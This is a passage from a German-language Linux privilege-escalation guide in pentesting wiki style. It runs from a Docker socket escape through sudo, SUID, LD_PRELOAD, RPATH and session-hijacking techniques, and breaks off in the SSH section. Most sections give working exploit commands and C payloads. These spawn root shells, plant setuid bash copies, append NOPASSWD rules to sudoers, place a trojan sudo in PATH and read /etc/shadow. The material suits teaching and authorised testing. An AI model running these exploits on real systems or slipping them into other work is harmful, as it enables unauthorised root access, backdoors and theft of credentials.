docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Diese Befehle erlauben es dir, einen Container mit root-Rechten auf dem Dateisystem des Hosts auszuführen.

#### **Docker API direkt verwenden**

Falls die Docker CLI nicht verfügbar ist, kann der Docker-Socket weiterhin über die Docker API und `curl`-Befehle manipuliert werden.

1.  **Docker-Images auflisten:** Die Liste der verfügbaren Images abrufen.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Einen Container erstellen:** Sende eine Anfrage, um einen Container zu erstellen, der das Root-Verzeichnis des Hosts einbindet.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Starte den neu erstellten Container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **An den Container anhängen:** Verwende `socat`, um eine Verbindung zum Container herzustellen, wodurch die Ausführung von Befehlen darin ermöglicht wird.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nachdem die `socat`-Verbindung eingerichtet ist, kannst du Befehle direkt im Container ausführen und hast root-Zugriff auf das Dateisystem des Hosts.

### Sonstiges

Beachte, dass wenn du Schreibrechte auf den Docker-Socket hast, weil du **inside the group `docker`** bist, du [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Wenn die [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Weitere Möglichkeiten, aus Docker auszubrechen oder es zur Rechteeskalation zu missbrauchen, findest du in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) Privilegieneskalation

Wenn du das **`ctr`**-Kommando verwenden kannst, lies die folgende Seite, da du es möglicherweise missbrauchen kannst, um Privilegien zu eskalieren:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** Privilegieneskalation

Wenn du das **`runc`**-Kommando verwenden kannst, lies die folgende Seite, da du es möglicherweise missbrauchen kannst, um Privilegien zu eskalieren:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgefeiltes Inter-Process Communication (IPC)-System, das Anwendungen ermöglicht, effizient zu interagieren und Daten zu teilen. Es wurde für moderne Linux-Systeme entwickelt und bietet ein robustes Framework für verschiedene Formen der Anwendungskommunikation.

Das System ist vielseitig: Es unterstützt grundlegende IPC, die den Datenaustausch zwischen Prozessen verbessert, ähnlich wie erweiterte UNIX domain sockets. Außerdem hilft es beim Broadcasten von Ereignissen oder Signalen und fördert so eine nahtlose Integration zwischen Systemkomponenten. Ein Signal von einem Bluetooth-Daemon über einen eingehenden Anruf kann beispielsweise einen Musikplayer stummschalten, um das Nutzererlebnis zu verbessern. Zusätzlich unterstützt D-Bus ein Remote-Objekt-System, das Service-Anfragen und Method-Aufrufe zwischen Anwendungen vereinfacht und Prozesse stromlinient, die früher komplex waren.

D-Bus arbeitet basierend auf einem **allow/deny-Modell**, das Nachrichtenberechtigungen (Method-Aufrufe, Signal-Emissionen usw.) anhand der kumulativen Wirkung passender Policy-Regeln verwaltet. Diese Richtlinien legen Interaktionen mit dem Bus fest und können durch die Ausnutzung dieser Berechtigungen potenziell zu einer Privilegieneskalation führen.

Ein Beispiel für eine solche Policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` wird gezeigt und beschreibt die Berechtigungen für den root-Benutzer, `fi.w1.wpa_supplicant1` zu besitzen, an ihn zu senden und Nachrichten von ihm zu empfangen.

Policies ohne einen spezifizierten Benutzer oder eine spezifizierte Gruppe gelten universell, während "default"-Kontext-Policies für alle gelten, die nicht durch andere spezifische Policies abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Erfahre hier, wie du eine D-Bus-Kommunikation enumerate und exploit kannst:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu enumerate und die Position der Maschine zu bestimmen.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Offene Ports

Überprüfe immer die Netzwerkdienste, die auf der Maschine laufen und mit denen du dich vor dem Zugriff nicht verbinden konntest:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Prüfe, ob du sniff traffic durchführen kannst. Wenn ja, könntest du einige credentials abgreifen.
```
timeout 1 tcpdump
```
## Benutzer

### Generische Enumeration

Überprüfe **wer** du bist, welche **Berechtigungen** du hast, welche **Benutzer** im System vorhanden sind, welche sich **anmelden** können und welche **root-Rechte** haben:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Große UID

Einige Linux-Versionen waren von einem Bug betroffen, der Benutzern mit **UID > INT_MAX** eine Privilegien-Eskalation ermöglicht. Mehr Infos: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Ausnutzen mit:** **`systemd-run -t /bin/bash`**

### Gruppen

Prüfe, ob du Mitglied einer Gruppe bist, die dir root-Rechte gewähren könnte:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Zwischenablage

Prüfe, ob sich etwas Interessantes in der Zwischenablage befindet (wenn möglich)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwortrichtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn du **ein Passwort** der Umgebung kennst, **versuche dich mit diesem Passwort als jeden Benutzer einzuloggen**.

### Su Brute

Falls es dir nichts ausmacht, viel Lärm zu erzeugen, und die Binaries `su` und `timeout` auf dem Rechner vorhanden sind, kannst du versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) zu brute-forcen.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) versucht mit dem `-a`-Parameter ebenfalls, Benutzer zu brute-forcen.

## Beschreibbare PATH-Ausnutzung

### $PATH

Wenn du feststellst, dass du **in einen Ordner des $PATH schreiben** kannst, kannst du unter Umständen Privilegien eskalieren, indem du **eine backdoor im beschreibbaren Ordner erstellst** mit dem Namen eines Befehls, der von einem anderen Benutzer (idealerweise root) ausgeführt wird und der **nicht aus einem Verzeichnis geladen wird, das vor deinem beschreibbaren Ordner im $PATH liegt**.

### SUDO and SUID

Du könntest berechtigt sein, einen Befehl mit sudo auszuführen, oder dieser könnte das suid bit gesetzt haben. Überprüfe es mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete Befehle erlauben es, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Die Sudo-Konfiguration kann einem Benutzer erlauben, einen Befehl mit den Rechten eines anderen Benutzers auszuführen, ohne das Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen. Es ist nun trivial, eine Shell zu erhalten, indem man einen ssh key in das `root`-Verzeichnis hinzufügt oder `sh` aufruft.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive erlaubt dem Benutzer, beim Ausführen von etwas **eine Umgebungsvariable zu setzen**:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **based on HTB machine Admirer**, war **anfällig** für **PYTHONPATH hijacking**, um eine beliebige python-Bibliothek zu laden, während das Skript als root ausgeführt wurde:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

Wenn die sudoers-Datei `BASH_ENV` beibehält (z. B. `Defaults env_keep+="ENV BASH_ENV"`), können Sie das nicht-interaktive Startverhalten von Bash ausnutzen, um beliebigen Code als root auszuführen, wenn Sie einen erlaubten Befehl aufrufen.

- Warum es funktioniert: Für nicht-interaktive Shells wertet Bash `$BASH_ENV` aus und liest diese Datei ein, bevor das Zielskript ausgeführt wird. Viele sudo-Regeln erlauben das Ausführen eines Skripts oder eines Shell-Wrappers. Wenn `BASH_ENV` durch sudo erhalten bleibt, wird Ihre Datei mit root-Rechten eingelesen.

- Voraussetzungen:
- Eine sudo-Regel, die Sie ausführen können (jedes Ziel, das `/bin/bash` nicht-interaktiv aufruft, oder jedes bash-Skript).
- `BASH_ENV` in `env_keep` vorhanden (prüfen mit `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Härtung:
- Entfernen Sie `BASH_ENV` (und `ENV`) aus `env_keep`, bevorzugen Sie `env_reset`.
- Vermeiden Sie Shell-Wrapper für sudo-erlaubte Befehle; verwenden Sie minimale Binaries.
- Erwägen Sie sudo I/O-Logging und Alarmierung, wenn beibehaltene env vars verwendet werden.

### Pfade, die sudo-Ausführung umgehen

**Jump** um andere Dateien zu lesen oder **symlinks** zu verwenden. Zum Beispiel in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_.
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn ein **wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary ohne Pfadangabe des Befehls

Wenn die **sudo-Berechtigung** einem einzelnen Befehl **ohne Angabe des Pfads** zugewiesen ist: _hacker10 ALL= (root) less_. Du kannst das ausnutzen, indem du die PATH-Variable änderst.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn ein **suid**-Binary **einen anderen Befehl ausführt, ohne den Pfad anzugeben (prüfe immer mit** _**strings**_ **den Inhalt einer merkwürdigen SUID-Binärdatei)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID-Binärdatei mit angegebenem Befehls-Pfad

Wenn die **suid**-Binärdatei **einen anderen Befehl ausführt und dabei den Pfad angibt**, kannst du versuchen, eine Funktion mit dem Namen des von der suid-Datei aufgerufenen Befehls zu exportieren.

Beispielsweise, wenn eine suid-Binärdatei _**/usr/sbin/service apache2 start**_ aufruft, musst du versuchen, die Funktion zu erstellen und zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Wenn Sie das suid binary aufrufen, wird diese Funktion ausgeführt

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die Umgebungsvariable **LD_PRELOAD** wird verwendet, um eine oder mehrere shared libraries (.so files) anzugeben, die vom Loader vor allen anderen geladen werden sollen, einschließlich der Standard-C-Bibliothek (`libc.so`). Dieser Vorgang ist als Preloading einer Bibliothek bekannt.

Um jedoch die Systemsicherheit zu gewährleisten und zu verhindern, dass diese Funktion — insbesondere bei **suid/sgid** executables — ausgenutzt wird, setzt das System bestimmte Bedingungen durch:

- Der Loader ignoriert **LD_PRELOAD** für Executables, bei denen die real user ID (_ruid_) nicht mit der effective user ID (_euid_) übereinstimmt.
- Bei Executables mit suid/sgid werden nur Bibliotheken aus Standardpfaden vorgeladen, die ebenfalls suid/sgid sind.

Privilege escalation kann auftreten, wenn Sie Befehle mit `sudo` ausführen können und die Ausgabe von `sudo -l` die Anweisung **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration erlaubt der Umgebungsvariable **LD_PRELOAD**, auch bei Ausführung von Befehlen mit `sudo` erhalten zu bleiben und erkannt zu werden, was möglicherweise zur Ausführung von arbitrary code mit erhöhten Rechten führen kann.
```
Defaults        env_keep += LD_PRELOAD
```
Als **/tmp/pe.c** speichern
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **kompiliere es** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich **escalate privileges** ausführen
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ein ähnlicher privesc kann ausgenutzt werden, wenn der Angreifer die **LD_LIBRARY_PATH** env variable kontrolliert, da er den Pfad kontrolliert, in dem Bibliotheken gesucht werden.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wenn man auf ein Binary mit **SUID**-Berechtigungen stößt, das ungewöhnlich erscheint, ist es gute Praxis zu prüfen, ob es **.so**-Dateien korrekt lädt. Dies kann überprüft werden, indem man den folgenden Befehl ausführt:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Zum Beispiel deutet ein Fehler wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ auf ein mögliches exploitation-Potenzial hin.

Um dies zu exploit-en, würde man vorgehen, indem man eine C-Datei erstellt, z. B. _"/path/to/.config/libcalc.c"_, die folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code versucht, nachdem er kompiliert und ausgeführt wurde, Privilegien zu erhöhen, indem er Dateiberechtigungen manipuliert und eine shell mit erhöhten privileges ausführt.

Kompiliere die obenstehende C file in eine shared object (.so) file mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte durch das Ausführen des betroffenen SUID binary der exploit ausgelöst werden, wodurch eine potenzielle Kompromittierung des Systems möglich ist.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Nachdem wir ein SUID binary gefunden haben, das eine library aus einem Ordner lädt, in den wir schreiben können, erstellen wir die library in diesem Ordner mit dem erforderlichen Namen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn Sie einen Fehler wie den folgenden erhalten:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Das bedeutet, dass die Bibliothek, die du erzeugt hast, eine Funktion namens `a_function_name` haben muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binaries, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe, aber für Fälle, in denen du **nur Argumente in einen Befehl injizieren** kannst.

Das Projekt sammelt legitime Funktionen von Unix-Binaries, die missbraucht werden können, um eingeschränkte Shells zu verlassen, Privilegien zu eskalieren oder aufrechtzuerhalten, Dateien zu übertragen, bind- und reverse-shells zu starten und andere Post-Exploitation-Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Wenn du Zugriff auf `sudo -l` hast, kannst du das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu prüfen, ob es Wege findet, eine sudo-Regel auszunutzen.

### Sudo-Token wiederverwenden

In Fällen, in denen du **sudo-Zugriff** hast, aber nicht das Passwort, kannst du Privilegien eskalieren, indem du **auf die Ausführung eines sudo-Befehls wartest und dann das Session-Token hijackst**.

Voraussetzungen, um Privilegien zu eskalieren:

- Du hast bereits eine Shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat **in den letzten 15 Minuten `sudo` verwendet** (standardmäßig ist das die Dauer des sudo-Tokens, die es uns erlaubt, `sudo` zu benutzen, ohne ein Passwort einzugeben)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- `gdb` ist zugänglich (du kannst es hochladen)

(Du kannst `ptrace_scope` vorübergehend mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder dauerhaft `/etc/sysctl.d/10-ptrace.conf` ändern und `kernel.yama.ptrace_scope = 0` setzen)

Wenn alle diese Anforderungen erfüllt sind, **kannst du Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Der **erste Exploit** (`exploit.sh`) wird das Binary `activate_sudo_token` in _/tmp_ erstellen. Du kannst es verwenden, um **den sudo-Token in deiner Sitzung zu aktivieren** (du erhältst nicht automatisch eine root-Shell, führe `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Der **zweite Exploit** (`exploit_v2.sh`) erstellt eine sh shell in _/tmp_, die **root gehört und setuid hat**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **dritte exploit** (`exploit_v3.sh`) wird eine **sudoers file** erstellen, die **sudo tokens ewig macht und allen Benutzern erlaubt, sudo zu verwenden**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn Sie im Ordner oder auf einer der darin erstellten Dateien **write permissions** haben, können Sie das Binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **create a sudo token for a user and PID**.\

Zum Beispiel, wenn Sie die Datei _/var/run/sudo/ts/sampleuser_ überschreiben können und eine Shell als dieser Benutzer mit PID 1234 haben, können Sie **obtain sudo privileges** erhalten, ohne das Passwort zu kennen, indem Sie:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien in `/etc/sudoers.d` legen fest, wer `sudo` benutzen kann und wie. Diese Dateien **können standardmäßig nur vom Benutzer root und von der Gruppe root gelesen werden**.\
**Wenn** Sie diese Datei **lesen** können, könnten Sie **einige interessante Informationen erhalten**, und wenn Sie eine Datei **schreiben** können, werden Sie in der Lage sein, **Privilegien zu eskalieren**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn du schreiben kannst, kannst du diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine weitere Möglichkeit, diese Berechtigungen auszunutzen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zur `sudo`-Binärdatei, wie `doas` unter OpenBSD. Prüfe die Konfiguration in `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn du weißt, dass ein **Benutzer sich normalerweise an einer Maschine anmeldet und `sudo` verwendet** und du eine Shell in diesem Benutzerkontext erhalten hast, kannst du **create a new sudo executable** erstellen, das deinen Code als root und anschließend den Befehl des Benutzers ausführt. Dann **modify the $PATH** des Benutzerkontexts (zum Beispiel indem du den neuen Pfad in .bash_profile hinzufügst), so dass, wenn der Benutzer sudo ausführt, dein sudo executable ausgeführt wird.

Beachte, dass, wenn der Benutzer eine andere Shell verwendet (nicht bash), du andere Dateien anpassen musst, um den neuen Pfad hinzuzufügen. Zum Beispiel[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifiziert `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Du findest ein weiteres Beispiel in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oder so etwas ausführen wie:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gemeinsame Bibliothek

### ld.so

Die Datei `/etc/ld.so.conf` gibt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` gelesen werden. Diese Konfigurationsdateien **zeigen auf andere Ordner**, in denen nach **Bibliotheken** gesucht wird. Zum Beispiel ist der Inhalt von `/etc/ld.so.conf.d/libc.conf` `/usr/local/lib`. **Das bedeutet, dass das System nach Bibliotheken innerhalb von `/usr/local/lib` suchen wird**.

Wenn aus irgendeinem Grund **ein Benutzer Schreibrechte** auf einem der angegebenen Pfade hat: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, irgendeine Datei innerhalb von `/etc/ld.so.conf.d/` oder einen Ordner, der in der Konfigurationsdatei in `/etc/ld.so.conf.d/*.conf` angegeben ist, könnte er möglicherweise Privilegien eskalieren.\
Siehe **wie diese Fehlkonfiguration ausgenutzt werden kann** auf der folgenden Seite:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Durch Kopieren der lib in `/var/tmp/flag15/` wird sie vom Programm an dieser Stelle verwendet, wie in der Variable `RPATH` angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Erstelle dann eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Fähigkeiten

Linux capabilities stellen einem Prozess einen **Teil der verfügbaren Root-Privilegien** zur Verfügung. Dies teilt effektiv die Root-**Privilegien in kleinere und unterscheidbare Einheiten auf**. Jede dieser Einheiten kann dann unabhängig Prozessen zugewiesen werden. Auf diese Weise wird die Gesamtheit der Privilegien reduziert, wodurch das Risiko einer Ausnutzung verringert wird.\
Lies die folgende Seite, um **mehr über Capabilities und deren Missbrauch zu erfahren**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Verzeichnisrechte

In einem Verzeichnis impliziert das **Bit für "execute"**, dass der betroffene Benutzer mit "**cd**" in das Verzeichnis wechseln kann.\
Das **"read"**-Bit bedeutet, dass der Benutzer die **Dateien auflisten** kann, und das **"write"**-Bit bedeutet, dass der Benutzer **Dateien löschen** und **neue Dateien erstellen** kann.

## ACLs

Access Control Lists (ACLs) stellen eine sekundäre Ebene diskretionärer Berechtigungen dar, die die traditionellen ugo/rwx-Berechtigungen **überschreiben** können. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die weder Eigentümer noch Teil der Gruppe sind, Rechte gewähren oder verweigern. Diese Ebene der **Granularität sorgt für eine präzisere Zugriffskontrolle**. Weitere Details finden Sie [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gib** Benutzer "kali" Lese- und Schreibrechte für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Erhalte** Dateien mit bestimmten ACLs vom System:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Offene shell sessions

In **old versions** kannst du möglicherweise eine **shell** session eines anderen Benutzers (**root**) **hijack**.\
In **newest versions** kannst du nur noch zu **screen sessions** deines **eigenen Benutzers** **connect**. Allerdings könntest du **interessante Informationen innerhalb der session** finden.

### screen sessions hijacking

**screen sessions auflisten**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**An eine session anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dies war ein Problem bei **älteren tmux-Versionen**. Es war mir nicht möglich, eine von root erstellte tmux (v2.1)-Session als nicht-privilegierter Benutzer zu hijack.

**tmux-Sessions auflisten**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**An eine Session anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Sieh dir **Valentine box von HTB** als Beispiel an.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- und SSH-Schlüssel, die auf Debian-basierten Systemen (Ubuntu, Kubuntu, etc) zwischen September 2006 und dem 13. Mai 2008 erzeugt wurden, können von diesem Bug betroffen sein.\
Dieser Fehler tritt beim Erstellen eines neuen ssh-Schlüssels auf diesen OS auf, da **nur 32.768 Varianten möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **mit dem öffentlichen ssh-Schlüssel kannst du nach dem entsprechenden privaten Schlüssel suchen**. Die berechneten Möglichkeiten findest du hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Gibt an, ob Passwort-Authentifizierung erlaubt ist. Der Standard ist `no`.
